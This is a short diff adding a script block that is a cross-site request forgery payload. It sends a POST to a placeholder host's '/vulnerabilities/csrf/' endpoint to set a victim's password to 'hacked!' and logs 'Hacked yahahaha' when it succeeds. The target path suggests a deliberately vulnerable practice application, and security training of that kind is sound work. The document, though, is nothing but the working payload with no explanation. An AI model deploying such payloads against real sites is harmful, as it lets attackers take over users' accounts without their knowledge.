@@ -1,0 +1,24 @@
+<script>
+    console.log("Starting...");
+    xhr = new XMLHttpRequest();
+    url =
+        "http://ip_address:port/vulnerabilities/csrf/?change=true&new_password=hacked!&confirm_password=hacked!";
+
+    xhr.open("POST", url);
+
+    xhr.onload = function () {
+        if (xhr.status === 200) {
+            console.log("Hacked yahahaha");
+        } else {
+            console.error("Error:", xhr.statusText);
+        }
+    };
+
+    xhr.onerror = function () {
+        console.error("Something's wrong");
+    };
+
+    xhr.send();
+
+    console.log("EOF");
+</script>
